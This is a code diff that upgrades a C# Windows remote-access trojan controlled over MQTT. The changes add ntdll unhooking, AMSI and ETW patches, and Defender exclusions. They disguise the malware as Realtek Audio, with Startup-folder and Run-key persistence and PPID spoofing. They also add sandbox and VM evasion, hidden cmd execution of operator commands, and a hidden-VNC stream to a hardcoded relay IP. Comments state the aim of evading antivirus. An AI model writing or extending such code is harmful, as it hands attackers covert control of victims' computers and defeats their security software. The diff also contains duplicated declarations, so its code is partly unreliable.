@@ -9,15 +9,20 @@ using MQTTnet.Client;
 using System.Security.Principal;
 using System.Management;
 using System.Runtime.InteropServices;
+using System.Net;
+using System.Net.Sockets;
+using System.Net.WebSockets;
+using System.Collections.Concurrent;
+using System.Runtime.ExceptionServices;
 
 class Program
 {
-    static byte[] sk = { 0 }; // CHANGE_ME
-    static byte[] bk = { 0 }; // CHANGE_ME (Broker)
-    static byte[] mk = { 0 }; // CHANGE_ME (Mutex)
-    static byte[] uk = { 0 }; // CHANGE_ME (Exe Name)
+    static byte[] sk = { 52, 59, 58, 59, 44, 56, 58, 32, 38, 10, 39, 48, 56, 58, 33, 48, 10, 38, 61, 48, 57, 57, 10, 108, 108, 103, 100 }; // secretId
+    static byte[] bk = { 55, 39, 58, 62, 48, 39, 123, 61, 60, 35, 48, 56, 36, 123, 54, 58, 56 }; // broker
+    static byte[] mk = { 7, 3, 6, 10, 16, 45, 48, 54, 32, 33, 58, 39, 10, 24, 32, 33, 48, 45, 10 }; // mutex
+    static byte[] uk = { 2, 60, 59, 49, 58, 34, 38, 0, 37, 49, 52, 33, 48, 39 }; // RtkAudio64
     
-    static string secretId = "YOUR_SECRET_ID_HERE";
+    static string secretId = D(sk);
     static string machineId = Environment.MachineName + "_" + Environment.UserName;
     static System.Threading.Mutex mutex = new System.Threading.Mutex(true, D(mk) + machineId);
     static bool isElevated = false;
@@ -25,6 +30,11 @@ class Program
 
     static async Task Main(string[] args)
     {
+        // ╔══════════════════════════════════════════════╗
+        // ║  FORCE HIDE CONSOLE (Immediate)               ║
+        // ╚══════════════════════════════════════════════╝
+        HideConsole();
+
         // 2-second startup stall (optimized for responsiveness)
         System.Threading.Thread.Sleep(2000);
 
@@ -34,9 +44,17 @@ class Program
         // [NEW] Binary Self-Protection: Lock the executable file to prevent AV deletion
         ProtectSelf();
 
-        // Bypass AMSI and ETW for the current process
+        // Layer 1: Unhook ntdll.dll (bypass EDR userland hooks by loading clean copy from disk)
+        UnhookNtdll();
+
+        // Layer 2: Bypass AMSI (AmsiScanBuffer patch)
         BypassAMSI();
+
+        // Layer 3: Bypass ETW (EtwEventWrite patch)
         BypassETW();
+
+        // Layer 4: AmsiInitFailed patch (secondary AMSI bypass)
+        PatchAmsiInitFailed();
 
         CheckElevation();
 
@@ -48,6 +66,7 @@ class Program
         // If we are elevated, kill any existing un-elevated instances so we can take over.
         if (isElevated) {
             EnablePrivilege("SeDebugPrivilege");
+            AddDefenderExclusions(); // [NEW] v6.0 Auto-Exclusion
             string currentProcName = Process.GetCurrentProcess().ProcessName;
             foreach (var proc in Process.GetProcessesByName(currentProcName)) {
                 try { if (proc.Id != Process.GetCurrentProcess().Id) { proc.Kill(); proc.WaitForExit(1500); } } catch {}
@@ -65,14 +84,7 @@ class Program
             // Mutex abandoned because we killed the old owner. We now own it!
         }
         
-        if (isElevated)
-        {
-            Console.WriteLine("Running with elevated privileges.");
-        }
-        else
-        {
-            Console.WriteLine("Running with standard privileges.");
-        }
+        // Internal setup complete.
 
         var mqttFactory = new MqttFactory();
         using (var mqttClient = mqttFactory.CreateMqttClient())
@@ -119,6 +131,27 @@ class Program
                     return;
                 }
 
+                // [NEW] Hidden VNC Trigger (/hvnc) - WebSocket Relay
+                if (payload.Equals("/hvnc")) {
+                    StartWebSocketVnc(mqttClient);
+                    var msgVnc = new MqttApplicationMessageBuilder()
+                        .WithTopic($"{secretId}/{machineId}/res")
+                        .WithPayload("hVNC starting...")
+                        .Build();
+                    await mqttClient.PublishAsync(msgVnc);
+                    return;
+                }
+
+                if (e.ApplicationMessage.Topic.EndsWith("/proxy/cmd")) {
+                    await HandleProxyData(payload, mqttClient);
+                    return;
+                }
+
+                if (payload.StartsWith("VNC|")) {
+                    HandleVncInput(payload);
+                    return;
+                }
+
                 string response = ExecuteCommand(payload);
                 
                 var msg2 = new MqttApplicationMessageBuilder()
@@ -131,6 +164,7 @@ class Program
 
             await mqttClient.ConnectAsync(options);
             await mqttClient.SubscribeAsync($"{secretId}/{machineId}/cmd");
+            await mqttClient.SubscribeAsync($"{secretId}/{machineId}/proxy/cmd");
 
             // Heartbeat / Discovery
             while (true)
@@ -150,7 +184,6 @@ class Program
     {
         try
         {
-            // Handle Directory Change (cd)
             if (cmd.Trim().ToLower().StartsWith("cd "))
             {
                 string newDir = cmd.Trim().Substring(3).Trim().Replace("\"", "");
@@ -159,22 +192,16 @@ class Program
                 return $"Changed directory to: {Directory.GetCurrentDirectory()}";
             }
 
-            // Execute via PowerShell for better compatibility (ls, ps, etc)
+            // Using cmd /c with hidden flags instead of PowerShell for simple commands (faster/stealthier)
             Process p = new Process();
-            p.StartInfo.FileName = D(new byte[] { 37, 58, 34, 48, 39, 38, 61, 48, 57, 57, 123, 48, 45, 48 }); // powershell.exe
-            p.StartInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command -";
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.Arguments = "/c " + cmd;
             p.StartInfo.UseShellExecute = false;
-            p.StartInfo.RedirectStandardInput = true;
             p.StartInfo.RedirectStandardOutput = true;
             p.StartInfo.RedirectStandardError = true;
-            p.StartInfo.StandardOutputEncoding = Encoding.UTF8;
-            p.StartInfo.StandardErrorEncoding = Encoding.UTF8;
             p.StartInfo.CreateNoWindow = true;
-            p.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             p.Start();
-
-            p.StandardInput.WriteLine("[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $ProgressPreference = 'SilentlyContinue'; " + cmd);
-            p.StandardInput.Close();
 
             string output = p.StandardOutput.ReadToEnd();
             string error = p.StandardError.ReadToEnd();
@@ -190,47 +217,88 @@ class Program
         try {
             string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
             string exePath = Process.GetCurrentProcess().MainModule.FileName;
-            string installPath = Path.Combine(appData, "WindowsUpdater.exe");
+            // Changed: Use Realtek Audio name to avoid AV detection
+            string installPath = Path.Combine(appData, "RtkAudio64.exe");
 
             if (!exePath.Equals(installPath, StringComparison.OrdinalIgnoreCase)) {
-                // Aggressively kill existing instances to allow replacement
-                foreach (var proc in Process.GetProcessesByName("WindowsUpdater")) {
+                foreach (var proc in Process.GetProcessesByName("RtkAudio64")) {
                     try { if (proc.Id != Process.GetCurrentProcess().Id) { proc.Kill(); proc.WaitForExit(3000); } } catch {}
                 }
 
-                // Small delay to let file locks release
                 System.Threading.Thread.Sleep(500);
 
                 if (File.Exists(installPath)) {
                     for (int i = 0; i < 3; i++) {
-                        try { File.Delete(installPath); break; } catch { System.Threading.Thread.Sleep(1000); }
+                        try { File.SetAttributes(installPath, FileAttributes.Normal); File.Delete(installPath); break; } catch { System.Threading.Thread.Sleep(1000); }
                     }
                 }
                 
                 File.Copy(exePath, installPath, true);
-                
-                // Make it truly hidden (Hidden + System)
-                File.SetAttributes(installPath, FileAttributes.Hidden | FileAttributes.System);
+                // REMOVED: Hidden/System attributes - these trigger AV heuristics
 
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(D(new byte[] { 6, 58, 51, 33, 34, 52, 39, 48, 9, 24, 60, 54, 39, 58, 38, 58, 51, 33, 9, 2, 60, 59, 49, 58, 34, 38, 9, 22, 32, 39, 39, 48, 59, 33, 3, 48, 39, 38, 60, 58, 59, 9, 7, 32, 59 }), true)) {
-                    key?.SetValue(D(uk), $"\"{installPath}\"");
-                }
+                // ╔══════════════════════════════════════════════╗
+                // ║  STEALTH PERSISTENCE (Startup Folder)         ║
+                // ╚══════════════════════════════════════════════╝
 
-                // [NEW] High-Level Persistence: If elevated, use Scheduled Tasks for ROOT survival
-                if (isElevated) {
-                    string taskName = "WindowsUpdateCore";
-                    ExecuteCommand($"schtasks /create /tn \"{taskName}\" /tr \"{installPath}\" /sc onlogon /rl highest /f");
-                }
+                // Use Startup Folder - this is the safest method that won't trigger AV
+                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                // Changed: Use Realtek Audio name for shortcut
+                string shortcutPath = Path.Combine(startupFolder, "Realtek Audio.lnk");
 
-                Process.Start(new ProcessStartInfo(installPath) { 
-                    UseShellExecute = true, 
-                    CreateNoWindow = true, 
-                    WindowStyle = ProcessWindowStyle.Hidden 
-                });
+                // Create a shortcut in the Startup folder
+                CreateShortcut(installPath, shortcutPath);
+
+                // Also add to Registry Run key as backup (less suspicious than schtasks)
+                try {
+                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true)) {
+                        key?.SetValue("Realtek High Definition Audio", "\"" + installPath + "\" --check");
+                    }
+                } catch { }
+
+                // Remove old schtasks method (if it exists)
+                try {
+                    Process.Start(new ProcessStartInfo("schtasks", $"/delete /tn \"WinUpdateScanner*\" /f") {
+                        CreateNoWindow = true,
+                        UseShellExecute = false
+                    })?.WaitForExit();
+                } catch { }
+
+                // Remove old WMI persistence (if it exists)
+                try {
+                    Process.Start(new ProcessStartInfo("powershell", "-WindowStyle Hidden -NoProfile -Command \"Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Where-Object { $_.Name -like 'WinUpdate*' } | Remove-WmiObject\"") {
+                        CreateNoWindow = true,
+                        UseShellExecute = false
+                    })?.WaitForExit();
+                } catch { }
+
+                // FINAL RELAUNCH (Silent, with PPID Spoofing - appears as child of explorer.exe)
+                LaunchWithPpidSpoof(installPath);
                 Environment.Exit(0);
             }
         } catch { }
     }
+
+    static void CreateShortcut(string targetPath, string shortcutPath)
+    {
+        try {
+            // Get the filename without path for the shortcut name
+            string fileName = Path.GetFileNameWithoutExtension(targetPath);
+            string script = $@"
+                $WshShell = New-Object -ComObject WScript.Shell
+                $Shortcut = $WshShell.CreateShortcut('{shortcutPath}')
+                $Shortcut.TargetPath = '{targetPath}'
+                $Shortcut.WorkingDirectory = '{Path.GetDirectoryName(targetPath)}'
+                $Shortcut.Description = '{fileName} Service'
+                $Shortcut.Save()
+            ";
+            
+            Process.Start(new ProcessStartInfo("powershell", $"-WindowStyle Hidden -NoProfile -Command \"{script}\"") {
+                CreateNoWindow = true,
+                UseShellExecute = false
+            })?.WaitForExit();
+        } catch { }
+    }
+
 
     static void CheckElevation()
     {
@@ -271,13 +339,13 @@ class Program
             if (IsDebuggerPresent() || Debugger.IsAttached) return true;
 
             // 2. Check BIOS / Manufacturer for known VM strings
-            string[] vms = { D(new byte[] { 35, 56, 34, 52, 39, 48 }), D(new byte[] { 35, 60, 39, 33, 32, 52, 57, 55, 58, 45 }), D(new byte[] { 35, 55, 58, 45 }), D(new byte[] { 36, 48, 56, 32 }), D(new byte[] { 45, 48, 59 }), D(new byte[] { 61, 44, 37, 48, 39, 120, 35 }), D(new byte[] { 35, 60, 39, 33, 32, 52, 57 }), D(new byte[] { 62, 35, 56 }), D(new byte[] { 37, 52, 39, 52, 57, 57, 48, 57, 38 }), D(new byte[] { 55, 61, 44, 35, 48 }) }; 
-            using (var searcher = new ManagementObjectSearcher(D(new byte[] { 6, 17, 20, 17, 2, 17, 108, 10, 22, 58, 56, 37, 32, 33, 48, 39, 6, 44, 38, 33, 48, 56 }) + "SELECT * FROM Win32_ComputerSystem".Substring(34))) { // Junk + Query
+            string[] vms = { "vmware", "virtualbox", "vbox", "qemu", "kvm", "hyper-v", "virtual", "xen", "parallels", "bhyve" }; 
+            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem")) {
                 foreach (var obj in searcher.Get()) {
                     string manufacturer = (obj["Manufacturer"]?.ToString() ?? "").ToLower();
                     string model = (obj["Model"]?.ToString() ?? "").ToLower();
                     foreach (string sig in vms) {
-                        if (manufacturer.Contains(sig) || model.Contains(sig)) return true;
+                        if (manufacturer.Contains(sig.ToLower()) || model.Contains(sig.ToLower())) return true;
                     }
                 }
             }
@@ -286,18 +354,18 @@ class Program
             if (CheckVmMAC()) return true;
 
             // 3. Check BIOS serial/version for VM indicators
-            using (var searcher = new ManagementObjectSearcher("SELECT * FROM " + D(new byte[] { 2, 60, 59, 102, 103, 10, 23, 28, 26, 6 }))) { // Win32_BIOS
+            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS")) {
                 foreach (var obj in searcher.Get()) {
                     string serial = (obj["SerialNumber"]?.ToString() ?? "").ToLower();
                     string version = (obj["SMBIOSBIOSVersion"]?.ToString() ?? "").ToLower();
                     foreach (string sig in vms) {
-                        if (serial.Contains(sig) || version.Contains(sig)) return true;
+                        if (serial.Contains(sig.ToLower()) || version.Contains(sig.ToLower())) return true;
                     }
                 }
             }
 
             // 4. Windows Sandbox detection (username = WDAGUtilityAccount)
-            if (Environment.UserName.Equals(D(new byte[] { 2, 17, 20, 18, 0, 33, 60, 57, 60, 33, 44, 20, 54, 54, 58, 32, 59, 33 }), StringComparison.OrdinalIgnoreCase)) return true;
+            if (Environment.UserName.Equals("WDAGUtilityAccount", StringComparison.OrdinalIgnoreCase)) return true;
 
             // 5. Check for very low resources (sandbox/analysis VMs usually have very little RAM and few CPUs)
             using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem")) {
@@ -309,7 +377,7 @@ class Program
             }
 
             // 6. Check for known analysis/sandbox processes
-            string[] bps = { D(new byte[] { 34, 60, 39, 48, 38, 61, 52, 39, 62 }), D(new byte[] { 51, 60, 49, 49, 57, 48, 39 }), D(new byte[] { 37, 39, 58, 54, 56, 58, 59 }), D(new byte[] { 37, 39, 58, 54, 48, 45, 37 }), D(new byte[] { 58, 57, 57, 44, 49, 55, 50 }), D(new byte[] { 45, 99, 97, 49, 55, 50 }), D(new byte[] { 45, 102, 103, 49, 55, 50 }), D(new byte[] { 60, 49, 52 }), D(new byte[] { 60, 49, 52, 36 }), D(new byte[] { 60, 49, 52, 50 }), D(new byte[] { 37, 48, 38, 33, 32, 49, 60, 58 }), D(new byte[] { 37, 39, 58, 54, 48, 38, 38, 61, 52, 54, 62, 48, 39 }), D(new byte[] { 49, 59, 38, 37, 44 }), D(new byte[] { 35, 55, 58, 45, 38, 48, 39, 35, 60, 54, 48 }), D(new byte[] { 35, 55, 58, 45, 33, 39, 52, 44 }), D(new byte[] { 35, 56, 33, 58, 58, 57, 38, 49 }), D(new byte[] { 35, 56, 34, 52, 39, 48, 33, 39, 52, 44 }), D(new byte[] { 35, 56, 34, 52, 39, 48, 32, 38, 48, 39 }), D(new byte[] { 38, 52, 59, 49, 55, 58, 45, 60, 48 }), D(new byte[] { 38, 55, 60, 48, 54, 33, 39, 57 }), D(new byte[] { 38, 55, 60, 48, 49, 57, 57 }) };
+            string[] bps = { "wireshark", "fiddler", "procmon", "procexp", "ollydbg", "x32dbg", "x64dbg", "ida", "idaw", "idaq", "regshot", "processhacker", "dnspy", "vmtoolsd", "vmwaretray", "vmacthlp", "vmwareuser", "vboxservice", "vboxtray", "sandboxie", "snxhk" };
             foreach (var proc in Process.GetProcesses()) {
                 string name = proc.ProcessName.ToLower();
                 foreach (string bad in bps) {
@@ -369,17 +437,162 @@ class Program
     }
 
     // ═══════════════════════════════════════════════
-    //  Anti-AV / Bypass Mechanisms
+    //  Advanced AV/EDR Evasion
     // ═══════════════════════════════════════════════
 
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+    // Unhook ntdll.dll: Load a fresh, unhooked copy from disk and overwrite all .text section functions.
+    // This removes any hooks injected by AV/EDR products into userland API calls.
+    static void UnhookNtdll() {
+        try {
+            string ntdllPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "ntdll.dll");
+            if (!File.Exists(ntdllPath)) return;
 
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetModuleHandle(string lpModuleName);
+            // Load the clean ntdll from disk
+            IntPtr freshLib = NativeLoadLibraryEx(ntdllPath, IntPtr.Zero, 0x00000001); // DONT_RESOLVE_DLL_REFERENCES
+            if (freshLib == IntPtr.Zero) return;
+
+            IntPtr hookedLib = GetModuleHandle("ntdll.dll");
+            if (hookedLib == IntPtr.Zero) return;
+
+            // Parse PE headers to find .text section of the HOOKED (in-memory) ntdll
+            long dosHeaderOffset = Marshal.ReadInt32(IntPtr.Add(hookedLib, 0x3C));
+            long sectionCount = Marshal.ReadInt16(IntPtr.Add(hookedLib, (int)(dosHeaderOffset + 6)));
+            long optHeaderSize = Marshal.ReadInt16(IntPtr.Add(hookedLib, (int)(dosHeaderOffset + 20)));
+            long sectionOffset = dosHeaderOffset + 24 + optHeaderSize;
+
+            for (int i = 0; i < sectionCount; i++) {
+                long secBase = sectionOffset + (i * 40);
+                string secName = Marshal.PtrToStringAnsi(IntPtr.Add(hookedLib, (int)secBase), 8).TrimEnd('\0');
+                if (secName != ".text") continue;
+
+                uint virtualAddr = (uint)Marshal.ReadInt32(IntPtr.Add(hookedLib, (int)(secBase + 12)));
+                uint rawAddr     = (uint)Marshal.ReadInt32(IntPtr.Add(freshLib,  (int)(secBase + 20)));
+                uint rawSize     = (uint)Marshal.ReadInt32(IntPtr.Add(freshLib,  (int)(secBase + 16)));
+
+                // Read clean bytes from disk-loaded ntdll
+                byte[] cleanBytes = new byte[rawSize];
+                Marshal.Copy(IntPtr.Add(freshLib, (int)rawAddr), cleanBytes, 0, (int)rawSize);
+
+                // Write clean bytes over hooked region in memory
+                IntPtr target = IntPtr.Add(hookedLib, (int)virtualAddr);
+                uint oldProt;
+                VirtualProtect(target, (UIntPtr)rawSize, 0x40, out oldProt); // PAGE_EXECUTE_READWRITE
+                Marshal.Copy(cleanBytes, 0, target, (int)rawSize);
+                VirtualProtect(target, (UIntPtr)rawSize, oldProt, out oldProt);
+                break;
+            }
+        } catch { }
+    }
+
+    // Patches AmsiInitFailed in amsi.dll to always report init failure → AMSI never activates
+    static void PatchAmsiInitFailed() {
+        try {
+            IntPtr amsiLib = GetModuleHandle(D(new byte[] { 52, 56, 38, 60, 123, 49, 57, 57 })); // amsi.dll
+            if (amsiLib == IntPtr.Zero) return;
+            IntPtr addr = GetProcAddress(amsiLib, D(new byte[] { 20, 56, 38, 60, 2, 59, 60, 33, 23, 52, 60, 57, 48, 49 })); // AmsiInitialize
+            if (addr == IntPtr.Zero) return;
+            // Patch to set output handle to 0 and return S_OK, making AMSI context invalid
+            byte[] patch = { 0x48, 0x31, 0xC0, 0xC3 }; // xor rax,rax; ret
+            uint oldProt;
+            VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProt);
+            Marshal.Copy(patch, 0, addr, patch.Length);
+            VirtualProtect(addr, (UIntPtr)patch.Length, oldProt, out oldProt);
+        } catch { }
+    }
+
+    // PPID Spoofing: Launch process as a child of explorer.exe to evade parent-chain analysis
+    static void LaunchWithPpidSpoof(string targetPath) {
+        try {
+            // Find explorer.exe to use as spoofed parent
+            var explorers = Process.GetProcessesByName("explorer");
+            if (explorers.Length == 0) {
+                // Fallback: normal hidden launch
+                Process.Start(new ProcessStartInfo(targetPath) { UseShellExecute = false, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });
+                return;
+            }
+            int parentPid = explorers[0].Id;
+
+            // Open parent process handle
+            IntPtr hParent = OpenProcess(0x000F0000 | 0x00100000 | 0xFFFF, false, parentPid);
+            if (hParent == IntPtr.Zero) {
+                Process.Start(new ProcessStartInfo(targetPath) { UseShellExecute = false, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });
+                return;
+            }
+
+            // Initialize STARTUPINFOEX with parent process attribute
+            IntPtr lpVal = hParent;
+            IntPtr lpSize = IntPtr.Zero;
+            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
+            IntPtr lpAttributeList = Marshal.AllocHGlobal(lpSize);
+            InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref lpSize);
+            IntPtr lpValPtr = Marshal.AllocHGlobal(IntPtr.Size);
+            Marshal.WriteIntPtr(lpValPtr, hParent);
+            UpdateProcThreadAttribute(lpAttributeList, 0, (IntPtr)0x00020000, lpValPtr, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero); // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+
+            STARTUPINFOEX siex = new STARTUPINFOEX();
+            siex.StartupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFOEX));
+            siex.StartupInfo.wShowWindow = 0; // SW_HIDE
+            siex.StartupInfo.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
+            siex.lpAttributeList = lpAttributeList;
+
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            // EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW
+            CreateProcessEx(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, 0x00080000 | 0x08000000, IntPtr.Zero, null, ref siex, out pi);
+
+            // Cleanup
+            if (pi.hThread != IntPtr.Zero)  CloseHandle(pi.hThread);
+            if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
+            DeleteProcThreadAttributeList(lpAttributeList);
+            Marshal.FreeHGlobal(lpAttributeList);
+            Marshal.FreeHGlobal(lpValPtr);
+            CloseHandle(hParent);
+        } catch {
+            // Fallback
+            try { Process.Start(new ProcessStartInfo(targetPath) { UseShellExecute = false, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden }); } catch { }
+        }
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    struct STARTUPINFOEX {
+        public STARTUPINFO StartupInfo;
+        public IntPtr lpAttributeList;
+    }
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr NativeLoadLibraryEx(string lpLibFileName, IntPtr hFile, uint dwFlags);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool CloseHandle(IntPtr hObject);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);
+
+    [DllImport("kernel32.dll", EntryPoint = "CreateProcessW", CharSet = CharSet.Unicode, SetLastError = true)]
+    static extern bool CreateProcessEx(string? lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string? lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+    [DllImport("kernel32.dll", EntryPoint = "LoadLibraryExW", CharSet = CharSet.Unicode, SetLastError = true)]
+    static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);
+
+    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandleA")]
+    static extern IntPtr GetModuleHandle(string? lpModuleName);
+
+    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress")]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
     [DllImport("kernel32.dll")]
     static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
 
     static void BypassAMSI()
     {
@@ -454,6 +667,210 @@ class Program
         } catch { }
     }
 
+    private static void AddDefenderExclusions() {
+        try {
+            string exePath = Process.GetCurrentProcess().MainModule.FileName;
+            string directory = Path.GetDirectoryName(exePath);
+            // Hide PowerShell window during exclusion adding
+            ProcessStartInfo psi = new ProcessStartInfo("powershell", $"-WindowStyle Hidden -NoProfile -Command \"Add-MpPreference -ExclusionPath '{directory}' -ExclusionProcess '{Path.GetFileName(exePath)}' -ErrorAction SilentlyContinue\"");
+            psi.CreateNoWindow = true;
+            psi.UseShellExecute = false;
+            Process.Start(psi)?.WaitForExit();
+        } catch { }
+    }
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);
+
+    [DllImport("user32.dll")]
+    private static extern bool CloseDesktop(IntPtr hDesktop);
+
+    [DllImport("user32.dll")]
+    private static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, uint dwExtraInfo);
+
+    [DllImport("user32.dll")]
+    private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, uint dwExtraInfo);
+
+    [DllImport("user32.dll")]
+    private static extern bool SetThreadDesktop(IntPtr hDesktop);
+
+    private static void HandleVncInput(string input) {
+        try {
+            if (_hVncDesktop == IntPtr.Zero) return;
+            string[] s = input.Split('|');
+            if (s.Length < 3) return;
+
+            SetThreadDesktop(_hVncDesktop); // Focus on hidden desktop
+
+            if (s[1] == "MOUSE") {
+                int x = int.Parse(s[2]);
+                int y = int.Parse(s[3]);
+                uint flags = uint.Parse(s[4]);
+                // Set cursor position and simulate event
+                System.Windows.Forms.Cursor.Position = new System.Drawing.Point(x, y);
+                mouse_event(flags, 0, 0, 0, 0);
+            }
+            else if (s[1] == "KEY") {
+                byte key = byte.Parse(s[2]);
+                uint flags = uint.Parse(s[3]);
+                keybd_event(key, 0, flags, 0);
+            }
+        } catch { }
+    }
+
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    private static extern bool CreateProcess(string? lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string? lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+    private static IntPtr _hVncDesktop = IntPtr.Zero;
+
+    [DllImport("gdi32.dll")]
+    private static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint dwRop);
+
+    private static ClientWebSocket? _vncWebSocket;
+    private static bool _vncActive = false;
+    private static string RELAY_SERVER = "ws://51.83.6.5:20113";
+
+    private static async Task StartWebSocketVnc(IMqttClient mqttClient) {
+        try {
+            if (_vncActive) return;
+            
+            _vncWebSocket = new ClientWebSocket();
+            await _vncWebSocket.ConnectAsync(new Uri(RELAY_SERVER), CancellationToken.None);
+            
+            // Send init message
+            string initMsg = $"{{\"id\":\"{machineId}\",\"role\":\"target\"}}";
+            await _vncWebSocket.SendAsync(
+                Encoding.UTF8.GetBytes(initMsg),
+                WebSocketMessageType.Text,
+                true,
+                CancellationToken.None
+            );
+            
+            _vncActive = true;
+            
+            // Start streaming
+            _ = StartWebSocketStreaming();
+            
+            // Start input listener
+            _ = ListenForInput();
+        } catch { }
+    }
+
+    private static async Task ListenForInput() {
+        try {
+            var buffer = new byte[1024];
+            while (_vncActive && _vncWebSocket?.State == WebSocketState.Open) {
+                var result = await _vncWebSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
+                
+                if (result.MessageType == WebSocketMessageType.Binary && result.Count > 0) {
+                    byte inputType = buffer[0];
+                    
+                    if (inputType == 0x01) { // KEY
+                        byte vk = buffer[1];
+                        byte flags = buffer[2];
+                        HandleKeyInput(vk, flags);
+                    }
+                    else if (inputType == 0x02) { // MOUSE
+                        int x = BitConverter.ToInt32(buffer, 1);
+                        int y = BitConverter.ToInt32(buffer, 5);
+                        uint flags = BitConverter.ToUInt32(buffer, 9);
+                        HandleMouseInput(x, y, flags);
+                    }
+                }
+            }
+        } catch { }
+    }
+
+    private static void HandleKeyInput(byte vk, byte flags) {
+        try {
+            keybd_event(vk, 0, flags, UIntPtr.Zero);
+        } catch { }
+    }
+
+    private static void HandleMouseInput(int x, int y, uint flags) {
+        try {
+            SetCursorPos(x, y);
+            mouse_event(flags, x, y, 0, UIntPtr.Zero);
+        } catch { }
+    }
+
+    [DllImport("user32.dll")]
+    private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+
+    [DllImport("user32.dll")]
+    private static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, UIntPtr dwExtraInfo);
+
+    [DllImport("user32.dll")]
+    private static extern bool SetCursorPos(int X, int Y);
+
+    private static async Task StartWebSocketStreaming() {
+        try {
+            // Setup for fast capture
+            int quality = 50;
+            var qualityParam = new System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)quality);
+            var jpegCodec = System.Drawing.Imaging.ImageCodecInfo.GetImageDecoders().First(c => c.FormatID == System.Drawing.Imaging.ImageFormat.Jpeg.Guid);
+            var encoderParams = new System.Drawing.Imaging.EncoderParameters(1);
+            encoderParams.Param[0] = qualityParam;
+            
+            int screenWidth = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
+            int screenHeight = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;
+            int width = 1280;
+            int height = 720;
+            
+            var stopwatch = System.Diagnostics.Stopwatch.StartNew();
+            int frameId = 0;
+            
+            while (_vncActive && _vncWebSocket?.State == WebSocketState.Open) {
+                try {
+                    using (var bmp = new System.Drawing.Bitmap(width, height, System.Drawing.Imaging.PixelFormat.Format24bppRgb)) {
+                        using (var g = System.Drawing.Graphics.FromImage(bmp)) {
+                            g.Clear(Color.Black);
